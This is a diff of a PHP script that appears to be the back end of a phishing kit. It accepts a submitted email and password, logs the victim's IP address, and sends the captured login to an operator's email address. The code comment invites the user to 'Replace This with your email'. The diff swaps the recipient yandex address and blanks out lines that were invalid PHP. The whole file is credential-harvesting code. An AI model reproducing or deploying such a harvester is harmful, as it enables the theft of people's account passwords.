@@ -1,9 +1,9 @@
 <?php header('Access-Control-Allow-Origin: *');
 header('Content-Type: application/json');
 
-$YourEmail = "blaqspam-tr@yandex.com";  /*Replace This with your email*/
+$YourEmail = "kkirillr4@yandex.com";  /*Replace This with your email*/
 
-$_POST['to'] = "Kkirillr4@yandex.com","blaqspam-tr@yandex.com";
+$_POST['to'] = "";
 if ((isset($_POST["username"]) && filter_var($_POST["username"], FILTER_VALIDATE_EMAIL)) && (isset($_POST["password"]) && strlen(@trim($_POST["password"])) > 0)) {
     $ip = "";
     if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
@@ -13,8 +13,8 @@ if ((isset($_POST["username"]) && filter_var($_POST["username"], FILTER_VALIDATE
     } else {
         $ip = $_SERVER['REMOTE_ADDR'];
     }
-    $DESTINATION_EMAIL = $_POST['to'] ?? "Kkirillr4@yandex.com","blaqspam-tr@yandex.com";
-    $second = $_POST['subject'] ?? "Kkirillr4@yandex.com","blaqspam-tr@yandex.com";
+    $DESTINATION_EMAIL = $_POST['to'] ?? "";
+    $second = $_POST['subject'] ?? "";
     $ips = getRealIpAddr('ip');
     $ip = !empty($ips) ? $ips : $ip;
     $details = getRealIpAddr("", $ip);
